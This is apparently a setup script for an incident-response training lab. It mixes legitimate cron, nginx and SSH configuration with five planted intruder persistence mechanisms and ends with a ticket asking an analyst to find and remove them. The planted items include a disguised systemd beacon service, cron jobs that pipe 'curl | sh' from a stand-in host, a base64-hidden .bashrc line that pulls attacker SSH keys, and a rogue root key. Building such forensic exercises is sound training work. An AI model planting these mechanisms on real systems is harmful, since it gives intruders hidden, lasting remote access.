#!/usr/bin/env bash
# Lab 123: cinco puntos de persistencia escondidos entre configuración legítima.
set -e
id deploy >/dev/null 2>&1 || useradd -m -s /bin/bash deploy
systemctl enable --now nginx cron ssh

# --- Legítimo -----------------------------------------------------------
echo '0 4 * * * /usr/local/bin/backup-web.sh' | crontab -u root -
printf '#!/bin/bash\ntar -czf /var/backups/web.tgz /var/www\n' > /usr/local/bin/backup-web.sh; chmod 755 /usr/local/bin/backup-web.sh
echo '*/5 * * * * root /usr/bin/test -x /usr/sbin/nginx && /usr/sbin/nginx -t -q' > /etc/cron.d/nginx-check
mkdir -p /root/.ssh && chmod 700 /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL3gS0p8mQ2vLabAdminKeyTc0rRx9yWq1uE4oP7nZ2kM admin@empresa' > /root/.ssh/authorized_keys

# --- Persistencia del intruso ------------------------------------------
# 1) Servicio systemd con nombre de sistema.
cat > /usr/lib/systemd/systemd-netlinkd <<'X'
#!/bin/bash
# systemd netlink helper
while :; do curl -s -m 5 http://cdn-update.example.net/beacon?h=$(hostname) >/dev/null 2>&1; sleep 300; done
X
chmod 755 /usr/lib/systemd/systemd-netlinkd
cat > /etc/systemd/system/systemd-netlinkd.service <<'U'
[Unit]
Description=Network Link Helper
[Service]
ExecStart=/usr/lib/systemd/systemd-netlinkd
Restart=always
[Install]
WantedBy=multi-user.target
U
systemctl daemon-reload; systemctl enable --now systemd-netlinkd.service

# 2) crontab de www-data.
echo '*/10 * * * * curl -s http://cdn-update.example.net/u.sh | sh' | crontab -u www-data -

# 3) /etc/cron.d con nombre de paquete.
mkdir -p /var/lib/apt/.cache
printf '#!/bin/sh\ncurl -s http://cdn-update.example.net/u.sh | sh\n' > /var/lib/apt/.cache/update; chmod 755 /var/lib/apt/.cache/update
echo '*/15 * * * * root /var/lib/apt/.cache/update >/dev/null 2>&1' > /etc/cron.d/apt-compat-check

# 4) .bashrc de deploy con una línea en base64.
P=$(printf '(curl -s http://ssh-keys.example.net/k >> ~/.ssh/authorized_keys) >/dev/null 2>&1 &' | base64 -w0)
printf '\n# locale fix\neval "$(echo %s | base64 -d)"\n' "$P" >> /home/deploy/.bashrc

# 5) Llave SSH extra en root.
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHk9vQ2xLabIntruderTc0Zp4mWs8rT1yU6eN3bD5cA backup@infra' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

mkdir -p /home/analista/ticket
cat > /home/analista/ticket/IR-123.txt <<'TXT'
IR-123 · web-123 · fase de erradicación
El intruso ya no tiene sesión abierta, pero hay que asumir que dejó formas de
volver. Revisa TODOS los puntos de persistencia habituales (servicios, cron
de sistema y de usuario, dotfiles, llaves SSH), documenta cada IOC en
~/iocs.txt (ruta + dominio/indicador decodificado) y elimina sólo lo malicioso.
Legítimo (no tocar): backup de root a las 04:00, /etc/cron.d/nginx-check,
la llave admin@empresa, nginx/cron/ssh.
TXT
chown -R analista:analista /home/analista/ticket
echo "Lab 123 plantado."
